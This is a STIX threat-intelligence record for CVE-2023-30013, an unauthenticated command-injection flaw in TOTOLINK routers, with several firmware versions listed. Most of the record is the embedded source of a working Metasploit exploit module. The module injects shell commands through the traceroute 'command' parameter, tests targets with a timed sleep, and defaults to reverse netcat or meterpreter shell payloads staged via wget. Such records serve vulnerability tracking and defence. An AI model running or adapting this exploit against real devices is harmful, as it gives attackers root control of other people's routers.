{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--96aac86d-ba04-4f92-8b43-050e49d15dbc",
    "created": "2024-08-14T17:00:14.931138Z",
    "modified": "2024-08-14T17:00:14.931145Z",
    "name": "TOTOLINK Wireless Routers unauthenticated remote command execution vulnerability.",
    "description": " Multiple TOTOLINK network products contain a command insertion vulnerability in setting/setTracerouteCfg. This vulnerability allows an attacker to execute arbitrary commands through the \"command\" parameter. After exploitation, an attacker will have full access with the same user privileges under which the webserver is running (typically as user `root`, ;-).  The following TOTOLINK network products and firmware are vulnerable: - Wireless Gigabit Router model X5000R with firmware X5000R_V9.1.0u.6118_B20201102.zip; - Wireless Gigabit Router model A7000R with firmware A7000R_V9.1.0u.6115_B20201022.zip; - Wireless Gigabit Router model A3700R with firmware A3700R_V9.1.2u.6134_B20201202.zip; - Wireless N Router model N200RE V5 with firmware N200RE_V5_V9.3.5u.6095_B20200916.zip; - Wireless N Router model N200RE V5 with firmware N200RE_V5_V9.3.5u.6139_B20201216.zip; - Wireless N Router model N350RT with firmware N350RT_V9.3.5u.6095_B20200916.zip; - Wireless N Router model N350RT with firmware N350RT_V9.3.5u.6139_B20201216.zip; - Wireless Extender model EX1200L with firmware EX1200L_V9.3.5u.6146_B20201023.zip; and - probably more looking at the scale of impacted devices :-(  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/totolink_unauth_rce_cve_2023_30013.rb",
            "external_id": "totolink_unauth_rce_cve_2023_30013.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-30013"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/xnX3I3PEgM/cve-2023-30013"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Kazamayc/vuln/tree/main/TOTOLINK/X5000R/2"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/stopwatch'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TOTOLINK Wireless Routers unauthenticated remote command execution vulnerability.',\n        'Description' => %q{\n          Multiple TOTOLINK network products contain a command insertion vulnerability in setting/setTracerouteCfg.\n          This vulnerability allows an attacker to execute arbitrary commands through the \"command\" parameter.\n          After exploitation, an attacker will have full access with the same user privileges under\n          which the webserver is running (typically as user `root`, ;-).\n\n          The following TOTOLINK network products and firmware are vulnerable:\n          - Wireless Gigabit Router model X5000R with firmware X5000R_V9.1.0u.6118_B20201102.zip;\n          - Wireless Gigabit Router model A7000R with firmware A7000R_V9.1.0u.6115_B20201022.zip;\n          - Wireless Gigabit Router model A3700R with firmware A3700R_V9.1.2u.6134_B20201202.zip;\n          - Wireless N Router model N200RE V5 with firmware N200RE_V5_V9.3.5u.6095_B20200916.zip;\n          - Wireless N Router model N200RE V5 with firmware N200RE_V5_V9.3.5u.6139_B20201216.zip;\n          - Wireless N Router model N350RT with firmware N350RT_V9.3.5u.6095_B20200916.zip;\n          - Wireless N Router model N350RT with firmware N350RT_V9.3.5u.6139_B20201216.zip;\n          - Wireless Extender model EX1200L with firmware EX1200L_V9.3.5u.6146_B20201023.zip; and\n          - probably more looking at the scale of impacted devices :-(\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor\n          'Kazamayc https://github.com/Kazamayc', # Discovery of the vulnerability\n        ],\n        'References' => [\n          ['CVE', '2023-30013'],\n          ['URL', 'https://attackerkb.com/topics/xnX3I3PEgM/cve-2023-30013'],\n          ['URL', 'https://github.com/Kazamayc/vuln/tree/main/TOTOLINK/X5000R/2']\n        ],\n        'DisclosureDate' => '2023-05-05',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_MIPSLE],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_MIPSLE],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => ['wget', 'echo'],\n              'Linemax' => 65535,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/mipsle/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 80,\n          'SSL' => false\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptInt.new('SLEEP', [true, 'Sleep time in seconds to test blind command injection', 3])\n    ])\n  end\n\n  def execute_command(cmd, _opts = {})\n    num = rand(1..500)\n    return send_request_cgi({\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'cstecgi.cgi'),\n      'keep_cookies' => true,\n      'data' => \"{\\\"command\\\":\\\"127.0.0.1; #{cmd};#\\\",\\\"num\\\":\\\"#{num}\\\",\\\"topicurl\\\":\\\"setTracerouteCfg\\\"}\"\n    })\n  end\n\n  def check\n    # Checking if the target is vulnerable by executing a randomized sleep to test the remote code execution\n    print_status(\"Checking if #{peer} can be exploited.\")\n    sleep_time = datastore['SLEEP']\n\n    # check response with echo command to determine if traceroute vulnerable function is available\n    res = execute_command(\"echo #{sleep_time}\")\n    return CheckCode::Unknown('No response received from target.') unless res\n    return CheckCode::Safe('No valid response received from target.') unless res.code == 200 && res.body.include?('success')\n\n    # if traceroute vulnerable function is available, perform blind command injection using the sleep comnmand\n    print_status(\"Performing command injection test issuing a sleep command of #{sleep_time} seconds.\")\n    res, elapsed_time = Rex::Stopwatch.elapsed_time do\n      execute_command(\"sleep #{sleep_time}\")\n    end\n    return CheckCode::Unknown('No response received from target.') unless res\n    return CheckCode::Safe('No valid response received from target.') unless res.code == 200 && res.body.include?('success')\n\n    print_status(\"Elapsed time: #{elapsed_time.round(2)} seconds.\")\n    return CheckCode::Safe('Blind command injection failed.') unless elapsed_time >= sleep_time\n\n    CheckCode::Vulnerable('Successfully tested blind command injection.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      # Don't check the response here since the server won't respond\n      # if the payload is successfully executed.\n      execute_cmdstager({ linemax: target.opts['Linemax'] })\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-05-05",
    "x_mitre_platforms": [
        "linux'"
    ]
}